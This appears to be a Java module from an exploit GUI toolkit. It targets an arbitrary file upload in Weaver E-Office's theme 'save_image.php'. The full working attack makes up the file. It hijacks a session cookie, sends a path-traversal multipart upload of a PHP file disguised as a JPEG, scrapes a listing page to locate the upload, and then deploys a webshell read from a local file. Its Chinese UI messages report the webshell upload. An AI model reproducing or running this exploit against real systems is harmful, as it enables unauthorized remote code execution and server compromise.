package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;
import utils.Methods;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class weaver_eo_sample_saveimage_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String saveimage(String url, String payload) {
        try {
            Response var = HttpTools.get(url+"/sample.php",new HashMap<>(),"utf-8");
            String cookie = var.getHead().substring(var.getHead().indexOf("PHPSESSID"),var.getHead().indexOf("path=/")+6);
            HashMap head = new HashMap();
            head.put("Cookie",cookie);
            HashMap head1 = head;
            head1.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK");


            String var1 = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"image_type\"\r\n" +
                    "\r\n" +
                    "../../clientTools\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"upfile\"; filename=\"R4gTest.php\"\r\n" +
                    "Content-Type: image/jpeg\r\n" +
                    "\r\n" +
                    payload+
                    "\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"theme_name\"\r\n" +
                    "\r\n" +
                    "theme3\r\n"+
                    "------WebKitFormBoundarymVk33liI64J7GQaK--";
            Response var2 = HttpTools.post(url+"/general/system/interface/theme_set/save_image.php",var1,head1,"utf-8");
            if(var2.getCode()==200 && var2.getText().contains("image_update.php?save=ok&theme_name=theme3")) {
                Response var3 = HttpTools.get(url + "/general/down.php", head, "utf-8");
                if (var3.getCode() == 200) {
                    String var4 = var3.getText();
                    int var5 = getIndexOf.getLineNumber(var4, "class=\"pubtable\">");
                    String var6 = getIndexOf.getMessage_useLine(var4, var5 + 1, var5 + 1);
                    String regex = "<td>(.*?)</td><td></td><td>";

                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(var6.replace("\n",""));

                    List<String> tdContents = new ArrayList<>();
                    while (matcher.find()) {
                        String result = matcher.group(1);
                        tdContents.add(result);
                    }
                    String[] tdArray = tdContents.toArray(new String[0]);
                    for(int i=tdArray.length-1;i>=0;i--){
                        Response var9 = HttpTools.get(url+"/clientTools/"+tdArray[i],head,"utf-8");
                        if(var9.getCode()==200 && var9.getText().contains("R4g11")){
                            return url+"/clientTools/"+tdArray[i];
                        }
                    }

                }
            }
        }catch (Exception e){

        }
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g11";
            HttpTools get_res = new HttpTools();
            Response get_resp = get_res.get(url + "/sample.php", new HashMap<>(),"utf-8");
            String result = saveimage(url,payload);
            Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
            if ( get_resp.getCode() != 404 &&get_resp.getCode() != 0&& result!=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_eo_sample_saveimage_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
//                textArea.appendText("\n weaver_ec_UploaderOperate_upload-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }


    private boolean attcmd(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload = "R4g11"+ Methods.readFile(pass);
            HttpTools get_res = new HttpTools();
            Response get_resp = get_res.get(url + "/sample.php", new HashMap<>(),"utf-8");
            String result = saveimage(url,shell_payload);
            if ( get_resp.getCode() != 404 && get_resp.getCode() != 0 && result!=null) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+result);
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
